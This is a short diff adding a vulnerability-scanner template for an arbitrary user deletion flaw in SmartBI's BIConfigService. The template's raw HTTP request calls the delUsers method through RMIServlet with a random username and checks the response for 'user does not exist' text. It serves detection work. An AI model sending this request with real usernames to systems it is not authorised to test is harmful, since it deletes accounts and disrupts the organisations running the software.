@@ -1,0 +1,32 @@
+id: smartbi-biconfigservice-anyfile-delete
+info:
+  name: SmartBI BIConfigService Arbitrary User Deletion
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: access-control
+  description: |
+    SmartBI BIConfigService is vulnerable to an arbitrary user deletion vulnerability.
+
+variables:
+  user: "{{rand_base(28)}}"
+
+http:
+  - raw:
+      - |
+        POST /smartbi/vision/RMIServlet?jsonpCallback=test HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        className=BIConfigService&methodName=delUsers&params=[["{{user}}"]]
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "NOT_EXIST_USER"
+          - "User does not exist"
+          - '"detail":'
